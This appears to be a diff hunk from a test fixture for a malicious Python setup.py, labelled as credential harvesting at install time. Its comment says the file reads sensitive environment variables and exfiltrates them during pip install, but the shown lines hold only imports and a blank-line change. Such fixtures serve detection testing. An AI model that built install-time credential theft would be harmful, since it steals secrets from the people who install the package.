@@ -1,6 +1,7 @@
 """Fixture: T3.5 — Credential harvesting at install time."""
 import os
 import urllib.request
+
 from setuptools import setup
 
 # Malicious: reads sensitive env vars and exfiltrates them during pip install
